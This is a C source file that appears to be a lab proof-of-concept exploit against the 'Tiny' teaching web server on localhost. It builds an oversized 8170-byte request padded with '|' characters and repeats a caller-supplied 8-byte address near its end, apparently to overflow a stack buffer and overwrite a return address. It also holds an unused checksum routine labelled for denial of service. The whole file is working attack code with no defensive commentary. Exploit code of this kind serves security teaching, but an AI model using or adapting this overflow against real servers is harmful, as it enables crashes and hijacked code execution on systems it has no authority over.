#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

unsigned short DoS_cksum(unsigned short *addr, int len) {
    int sum = 0;
    unsigned short res = 0;
    
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    
    if (len == 1) {
        *((unsigned char *) (&res)) = *((unsigned char *)
                                        addr);
        sum += res;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    
    res = ~sum;
    return res;
}

int main(int argc,char* argv[]){
    
    if(argc < 3){
        printf("usage: \n    %s port address\n", argv[0]);
        exit(1);
    }
    
    int PORT = atoi(argv[1]);
    long long num;
    sscanf(argv[2], "%llx", &num);
    
    char numstr[8];
    memcpy(numstr, &num, sizeof(num));
    
    printf("%d\n",PORT);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        perror("socket()");
        exit(1);
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = htonl(0x7f000001); // 127.0.0.1
    if(connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
        perror("connect");
        exit(1);
    }
    printf("connected\n");
    char buf[8170];
    int n = sprintf(buf, "<p>%s: ", "Tiny does not implement this method");
    printf("n:%d\n", n);
    
    int i;
    for(i = 0; i < sizeof(buf); i++) {
        buf[i] = '|';
    }
    memcpy(buf + 8136, numstr, sizeof(numstr));
    memcpy(buf + 8144, numstr, sizeof(numstr));
    memcpy(buf + 8152, numstr, sizeof(numstr));
    memcpy(buf + 8160, numstr, sizeof(numstr));
    //buf[8168] = '\r';
    //buf[8169] = '\n';
    buf[8168] = '\r';
    buf[8169] = '\n';
    
    write(sock, buf, sizeof(buf));
    sleep(5);
    close(sock);
    
    return 0;
}
